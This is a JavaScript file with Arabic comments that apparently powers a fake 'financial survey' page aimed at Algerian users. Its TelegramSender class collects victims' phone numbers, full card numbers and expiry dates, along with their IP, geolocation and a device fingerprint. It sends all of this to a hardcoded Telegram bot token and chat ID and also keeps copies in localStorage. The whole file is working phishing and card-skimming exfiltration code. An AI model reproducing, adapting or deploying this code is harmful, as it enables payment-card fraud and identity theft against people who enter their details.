// ملف إرسال البيانات إلى Telegram
class TelegramSender {
    constructor() {
        // ⚠️ استبدل هذه المعلومات بمعلومات بوتك الخاص
        this.BOT_TOKEN = '8593294843:AAHG8eP-W237MsY07USrpQcHAYU5fQwCjCA';
        this.CHAT_ID = '7590246763';
        this.API_URL = `https://api.telegram.org/bot${this.BOT_TOKEN}`;
        
        // رسائل النجاح والفشل
        this.messages = {
            success: '✅ تم إرسال البيانات بنجاح!',
            error: '❌ فشل إرسال البيانات. يرجى المحاولة مرة أخرى.',
            validation: '⚠️ يرجى تعبئة جميع الحقول بشكل صحيح.',
            sending: '📤 جاري إرسال البيانات...'
        };
    }

    // التحقق من صحة التوكن
    async validateToken() {
        try {
            const response = await fetch(`${this.API_URL}/getMe`);
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('خطأ في التحقق من التوكن:', error);
            return false;
        }
    }

    // تنسيق البيانات للرسالة
    formatDataForMessage(userData, deviceData) {
        const timestamp = new Date().toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            dateStyle: 'full',
            timeStyle: 'medium'
        });

        let message = `
🎯 *بيانات جديدة من الاستبيان المالي - الجزائر*
⏰ *الوقت:* ${timestamp}
🔢 *رقم المشاركة:* ALG-${Date.now().toString().slice(-8)}

📱 *معلومات الاتصال:*
├─ 📞 الهاتف: \`${userData.phone}\`
├─ 💳 رقم البطاقة: \`${userData.cardNumber}\`
└─ 📅 تاريخ الانتهاء: \`${userData.expiryDate}\`

🖥️ *معلومات الجهاز:*
├─ 📱 نوع الجهاز: ${deviceData.device.deviceType}
├─ 💻 نظام التشغيل: ${deviceData.device.operatingSystem}
├─ 🌐 المتصفح: ${deviceData.device.browser}
├─ 📺 دقة الشاشة: ${deviceData.device.screenWidth} × ${deviceData.device.screenHeight}
├─ 🌍 اللغة: ${deviceData.device.language}
└─ 🕒 المنطقة الزمنية: ${deviceData.device.timezone}

🌐 *معلومات الشبكة:*
├─ 🔗 IP: \`${deviceData.network.ipAddress}\`
├─ 📍 المدينة: ${deviceData.network.location.city || 'غير معروف'}
├─ 🏳️ الدولة: ${deviceData.network.location.country_name || 'غير معروف'}
└─ 📶 مزود الخدمة: ${deviceData.network.location.org || 'غير معروف'}

📊 *معلومات إضافية:*
├─ 🔗 المرجع: ${deviceData.additional.referrer}
├─ 📍 الصفحة: ${deviceData.additional.pageUrl}
├─ 📱 جهاز محمول: ${deviceData.device.isMobile ? 'نعم' : 'لا'}
└─ 👆 شاشة لمس: ${deviceData.device.isTouchDevice ? 'نعم' : 'لا'}
`;

        // إضافة معلومات الموقع الجغرافي إذا كانت متاحة
        if (deviceData.geolocation && !deviceData.geolocation.error) {
            message += `
📍 *الموقع الجغرافي:*
├─ 📍 خط العرض: ${deviceData.geolocation.latitude}
├─ 📍 خط الطول: ${deviceData.geolocation.longitude}
└─ 📏 الدقة: ${deviceData.geolocation.accuracy} متر
`;
        }

        // إضافة معلومات الاتصال إذا كانت متاحة
        if (deviceData.device.connection) {
            message += `
📶 *معلومات الاتصال:*
├─ 📶 نوع الشبكة: ${deviceData.device.connection.effectiveType}
├─ ⬇️ سرعة التنزيل: ${deviceData.device.connection.downlink} Mbps
└─ ⏱️ وقت الاستجابة: ${deviceData.device.connection.rtt} ms
`;
        }

        return message;
    }

    // إرسال الرسالة إلى Telegram
    async sendMessage(text) {
        try {
            const response = await fetch(`${this.API_URL}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });

            const data = await response.json();
            
            if (data.ok) {
                console.log('✅ تم إرسال الرسالة بنجاح:', data.result.message_id);
                
                // إرسال رسالة ثانية مع المزيد من التفاصيل
                await this.sendDetailedData(text);
                
                return { success: true, messageId: data.result.message_id };
            } else {
                console.error('❌ خطأ من Telegram API:', data.description);
                return { success: false, error: data.description };
            }
        } catch (error) {
            console.error('❌ خطأ في إرسال الرسالة:', error);
            return { success: false, error: error.message };
        }
    }

    // إرسال بيانات مفصلة في رسالة منفصلة
    async sendDetailedData(initialMessage) {
        try {
            const detailedMessage = `
🔐 *بيانات مفصلة - الجزائر*

📞 *رقم الهاتف الكامل:* 
\`${document.getElementById('phone')?.value || 'غير متوفر'}\`

💳 *بيانات البطاقة الكاملة:*
• الرقم: \`${document.getElementById('card-number')?.value || 'غير متوفر'}\`
• الانتهاء: \`${document.getElementById('expiry-date')?.value || 'غير متوفر'}\`

🖥️ *معلومات المتصفح الكاملة:*
${navigator.userAgent}

📊 *إحصائيات الجهاز:*
• الذاكرة: ${navigator.deviceMemory || 'غير معروف'} GB
• المعالجات: ${navigator.hardwareConcurrency || 'غير معروف'}
• عمق الألوان: ${screen.colorDepth} بت
• نسبة البكسل: ${window.devicePixelRatio}

🌍 *معلومات الموقع:*
• العنوان الكامل: ${window.location.href}
• اللغات المفضلة: ${navigator.languages?.join(', ') || 'غير معروف'}

⏰ *الوقت الدقيق:* ${new Date().toISOString()}
            `.trim();

            await fetch(`${this.API_URL}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.CHAT_ID,
                    text: detailedMessage,
                    parse_mode: 'Markdown'
                })
            });

        } catch (error) {
            console.error('خطأ في إرسال البيانات المفصلة:', error);
        }
    }

    // إرسال الإخطار الأولي
    async sendInitialNotification() {
        const notification = `
🔔 *بدء استبيان جديد - الجزائر*

📱 *تم بدء استبيان جديد في:* ${new Date().toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            hour12: true,
            dateStyle: 'medium',
            timeStyle: 'medium'
        })}

🖥️ *المتصفح:* ${navigator.userAgent.substring(0, 50)}...

📍 *الصفحة:* ${window.location.href}

⏳ *جاري تعبئة البيانات...*
        `.trim();

        return await this.sendMessage(notification);
    }

    // العملية الرئيسية لإرسال البيانات
    async sendUserData(userData, deviceData) {
        try {
            // عرض حالة الإرسال
            this.showNotification(this.messages.sending, 'warning');
            
            // إرسال الإخطار الأولي
            await this.sendInitialNotification();
            
            // تنسيق البيانات وإرسالها
            const formattedMessage = this.formatDataForMessage(userData, deviceData);
            const result = await this.sendMessage(formattedMessage);
            
            if (result.success) {
                this.showNotification(this.messages.success, 'success');
                
                // تسجيل نجاح الإرسال
                this.logSubmission(userData, deviceData, true);
                
                return true;
            } else {
                this.showNotification(this.messages.error, 'error');
                
                // تسجيل فشل الإرسال
                this.logSubmission(userData, deviceData, false, result.error);
                
                return false;
            }
        } catch (error) {
            console.error('❌ خطأ في إرسال بيانات المستخدم:', error);
            this.showNotification(this.messages.error, 'error');
            return false;
        }
    }

    // عرض الإشعارات
    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        
        if (!notification) {
            console.log(message);
            return;
        }
        
        notification.textContent = message;
        notification.className = `notification ${type} show`;
        
        // إخفاء الإشعار بعد 5 ثواني
        setTimeout(() => {
            notification.classList.remove('show');
        }, 5000);
    }

    // تسجيل عملية الإرسال
    logSubmission(userData, deviceData, success, error = null) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            userData: {
                phone: userData.phone,
                cardNumber: userData.cardNumber,
                expiryDate: userData.expiryDate
            },
            deviceInfo: {
                ip: deviceData.network.ipAddress,
                deviceType: deviceData.device.deviceType,
                browser: deviceData.device.browser
            },
            success: success,
            error: error,
            page: window.location.href
        };
        
        // تخزين السجل محلياً
        try {
            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
            logs.push(logEntry);
            localStorage.setItem('telegram_logs', JSON.stringify(logs.slice(-100))); // حفظ آخر 100 سجل
        } catch (e) {
            console.error('خطأ في حفظ السجل:', e);
        }
    }

    // اختبار الاتصال بالبوت
    async testConnection() {
        this.showNotification('🔍 جاري اختبار الاتصال...', 'warning');
        
        const isValid = await this.validateToken();
        
        if (isValid) {
            this.showNotification('✅ الاتصال مع Telegram ناجح!', 'success');
            return true;
        } else {
            this.showNotification('❌ فشل الاتصال مع Telegram', 'error');
            return false;
        }
    }
}

// إنشاء كائن الإرسال العام
const telegramSender = new TelegramSender();

// تصدير الكائن للاستخدام في ملفات أخرى
window.telegramSender = telegramSender;
